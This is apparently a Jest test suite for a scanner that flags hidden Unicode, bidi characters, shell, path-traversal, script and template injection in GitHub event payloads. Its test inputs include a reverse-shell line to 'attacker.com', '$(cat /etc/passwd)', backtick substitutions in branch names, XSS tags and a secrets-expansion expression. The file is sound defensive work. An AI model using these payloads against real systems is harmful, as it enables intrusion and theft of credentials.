'use strict';

const {
  scanString,
  scanValue,
  checkHiddenUnicode,
  checkBidiAttack,
  checkShellInjection,
  checkPathTraversal,
  checkScriptInjection,
  checkTemplateInjection,
} = require('../src/scanner');

describe('checkHiddenUnicode', () => {
  test('detects zero width space (U+200B)', () => {
    const findings = checkHiddenUnicode('hello\u200Bworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('hidden_unicode');
    expect(findings[0].description).toContain('U+200B');
    expect(findings[0].count).toBe(1);
  });

  test('detects BOM / zero width no-break space (U+FEFF)', () => {
    const findings = checkHiddenUnicode('\uFEFFhello');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+FEFF');
  });

  test('detects null character (U+0000)', () => {
    const findings = checkHiddenUnicode('hello\u0000world');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+0000');
  });

  test('detects left-to-right mark (U+200E)', () => {
    const findings = checkHiddenUnicode('hello\u200Eworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+200E');
  });

  test('detects right-to-left mark (U+200F)', () => {
    const findings = checkHiddenUnicode('hello\u200Fworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+200F');
  });

  test('detects soft hyphen (U+00AD)', () => {
    const findings = checkHiddenUnicode('hello\u00ADworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+00AD');
  });

  test('counts multiple occurrences', () => {
    const findings = checkHiddenUnicode('\u200B\u200B\u200B');
    expect(findings).toHaveLength(1);
    expect(findings[0].count).toBe(3);
  });

  test('returns empty array for clean text', () => {
    const findings = checkHiddenUnicode('Hello, this is a normal string!');
    expect(findings).toHaveLength(0);
  });

  test('returns empty array for empty string', () => {
    const findings = checkHiddenUnicode('');
    expect(findings).toHaveLength(0);
  });
});

describe('checkBidiAttack', () => {
  test('detects right-to-left override (U+202E) — Trojan Source', () => {
    const findings = checkBidiAttack('hello\u202Eworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('bidi_attack');
    expect(findings[0].description).toContain('U+202E');
    expect(findings[0].description).toContain('Trojan Source');
  });

  test('detects left-to-right override (U+202D)', () => {
    const findings = checkBidiAttack('hello\u202Dworld');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+202D');
  });

  test('detects right-to-left embedding (U+202B)', () => {
    const findings = checkBidiAttack('\u202Bhello');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+202B');
  });

  test('detects pop directional formatting (U+202C)', () => {
    const findings = checkBidiAttack('hello\u202C');
    expect(findings).toHaveLength(1);
    expect(findings[0].description).toContain('U+202C');
  });

  test('detects first strong isolate (U+2068)', () => {
    const findings = checkBidiAttack('\u2068hello\u2069');
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  test('returns empty array for clean text', () => {
    const findings = checkBidiAttack('Hello world, this is a normal string!');
    expect(findings).toHaveLength(0);
  });
});

describe('checkShellInjection', () => {
  test('detects backtick command substitution', () => {
    const findings = checkShellInjection('feature/`ls -la`-branch');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('shell_injection');
    expect(findings[0].description).toContain('Backtick');
  });

  test('detects dollar-paren command substitution', () => {
    const findings = checkShellInjection('$(cat /etc/passwd)');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('shell_injection');
    expect(findings[0].description).toContain('$()');
  });

  test('detects semicolon chaining to shell command', () => {
    const findings = checkShellInjection('main; bash -i >& /dev/tcp/attacker.com/4444 0>&1');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('shell_injection');
  });

  test('detects pipe to shell', () => {
    const findings = checkShellInjection('update | bash');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('shell_injection');
  });

  test('returns empty array for branch name without injection', () => {
    const findings = checkShellInjection('feature/add-new-component');
    expect(findings).toHaveLength(0);
  });

  test('returns empty array for normal PR title', () => {
    const findings = checkShellInjection('Fix: update dependencies and improve performance');
    expect(findings).toHaveLength(0);
  });
});

describe('checkPathTraversal', () => {
  test('detects Unix-style path traversal (../)', () => {
    const findings = checkPathTraversal('../../../etc/passwd');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('path_traversal');
  });

  test('detects Windows-style path traversal (..\\)', () => {
    const findings = checkPathTraversal('..\\..\\windows\\system32');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('path_traversal');
  });

  test('returns empty array for clean path', () => {
    const findings = checkPathTraversal('/usr/local/bin/node');
    expect(findings).toHaveLength(0);
  });

  test('returns empty array for relative path without traversal', () => {
    const findings = checkPathTraversal('src/components/Button.js');
    expect(findings).toHaveLength(0);
  });
});

describe('checkScriptInjection', () => {
  test('detects script tag injection', () => {
    const findings = checkScriptInjection('Hello <script>alert("xss")</script>');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('script_injection');
    expect(findings[0].description).toContain('script tag');
  });

  test('detects javascript: protocol', () => {
    const findings = checkScriptInjection('[click me](javascript:alert(1))');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('script_injection');
    expect(findings[0].description).toContain('JavaScript protocol');
  });

  test('detects iframe injection', () => {
    const findings = checkScriptInjection('<iframe src="evil.com"></iframe>');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('script_injection');
    expect(findings[0].description).toContain('iframe');
  });

  test('returns empty array for clean HTML link', () => {
    const findings = checkScriptInjection('[link](https://example.com)');
    expect(findings).toHaveLength(0);
  });

  test('returns empty array for normal text', () => {
    const findings = checkScriptInjection('This is a normal comment with no injection.');
    expect(findings).toHaveLength(0);
  });
});

describe('checkTemplateInjection', () => {
  test('detects GitHub Actions expression injection ${{', () => {
    const findings = checkTemplateInjection('${{ secrets.MY_TOKEN }}');
    // ${{ triggers both the ${{ pattern and the {{...}} pattern
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.description.includes('${{'))).toBe(true);
    expect(findings.every((f) => f.type === 'template_injection')).toBe(true);
  });

  test('detects template expression {{...}}', () => {
    const findings = checkTemplateInjection('Hello {{user.name}}!');
    expect(findings).toHaveLength(1);
    expect(findings[0].type).toBe('template_injection');
    expect(findings[0].description).toContain('{{');
  });

  test('returns empty array for clean text', () => {
    const findings = checkTemplateInjection('Hello world!');
    expect(findings).toHaveLength(0);
  });
});

describe('scanString', () => {
  test('combines all detection results', () => {
    const text = 'hello\u200Bworld$(evil)';
    const findings = scanString(text);
    const types = findings.map((f) => f.type);
    expect(types).toContain('hidden_unicode');
    expect(types).toContain('shell_injection');
  });

  test('returns empty for clean string', () => {
    const findings = scanString('This is a perfectly normal pull request title!');
    expect(findings).toHaveLength(0);
  });
});

describe('scanValue', () => {
  test('scans a flat object and reports correct paths', () => {
    const findings = scanValue({ title: 'normal title', body: 'hello\u200Bworld' });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('body');
    expect(findings[0].results[0].type).toBe('hidden_unicode');
  });

  test('scans nested objects with dot-notation paths', () => {
    const findings = scanValue({
      pull_request: {
        title: 'normal title',
        body: 'hello\u202Eworld',
      },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('pull_request.body');
    expect(findings[0].results[0].type).toBe('bidi_attack');
  });

  test('scans array elements with bracket notation paths', () => {
    const findings = scanValue({ labels: ['good-label', '<script>bad</script>'] });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('labels[1]');
    expect(findings[0].results[0].type).toBe('script_injection');
  });

  test('handles deeply nested objects', () => {
    const findings = scanValue({
      issue: {
        comments: [{ body: 'normal' }, { body: '$(cat /etc/passwd)' }],
      },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('issue.comments[1].body');
  });

  test('returns empty array for clean event payload', () => {
    const findings = scanValue({
      action: 'opened',
      pull_request: {
        title: 'Add new feature',
        body: 'This PR adds a great new feature',
        head: { ref: 'feature/new-button' },
      },
    });
    expect(findings).toHaveLength(0);
  });

  test('handles null and non-string values without error', () => {
    const findings = scanValue({
      number: 42,
      merged: null,
      closed_at: null,
      title: 'clean title',
    });
    expect(findings).toHaveLength(0);
  });

  test('detects attack in PR branch name', () => {
    const findings = scanValue({
      pull_request: {
        head: { ref: 'feature/`whoami`-test' },
      },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('pull_request.head.ref');
    expect(findings[0].results[0].type).toBe('shell_injection');
  });

  test('detects hidden unicode in issue title', () => {
    const findings = scanValue({
      issue: { title: 'Normal issue\u200B with hidden char' },
    });
    expect(findings).toHaveLength(1);
    expect(findings[0].path).toBe('issue.title');
  });
});
